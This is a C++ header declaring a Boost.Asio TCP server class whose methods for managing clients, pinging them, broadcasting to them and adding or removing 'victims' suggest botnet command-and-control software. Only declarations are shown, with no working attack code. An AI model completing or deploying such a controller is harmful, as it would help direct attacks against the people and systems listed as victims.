#ifndef SERVER_H
#define SERVER_H

#define INACTIVITY_TIMEOUT 1 * 1000000	// 1sec
#include <unistd.h>

#include <algorithm>
#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/bind/bind.hpp>
#include <chrono>
#include <cstdint>
#include <future>
#include <iostream>
#include <memory>
#include <mutex>
#include <optional>
#include <unordered_map>

#include "msg_parser.h"
#include "session.h"

namespace io = boost::asio;
using tcp = io::ip::tcp;
using err = boost::system::error_code;
class server {
    public:
	enum command_code {
		eARE_YOU_ALIVE,
		eCOMMAND_NOT_FOUND,
	};

	server(io::io_context &, std::uint16_t);
	void start();

	// Methods used by manager executable
	void initManager(std::string);
	void getClients();
	void getVictims();
	void addVictim(std::string);
	void removeVictim(std::string);
	void removeClient(std::string);

    private:
	void accept();
	void onAccept(err error_code);
	void handleResponse(std::string &, session *);

	void sendAllClients(std::string const &);
	void pingClients();

	long int generateId();
	bool checkCredentials(std::string);

	std::unordered_map<std::string, std::function<void(std::vector<std::string> &, session *)>> commands_;

	void handleAlive(std::vector<std::string> &, session *);

	std::future<void> routine_future_;

	io::io_context &io_context;
	tcp::acceptor acceptor;
	std::optional<tcp::socket> socket;

	std::unordered_map<long int, std::shared_ptr<session>> clients_map;
	std::mutex clients_m;
	msg_parser msg_parser_;
};

#endif	// SERVER_H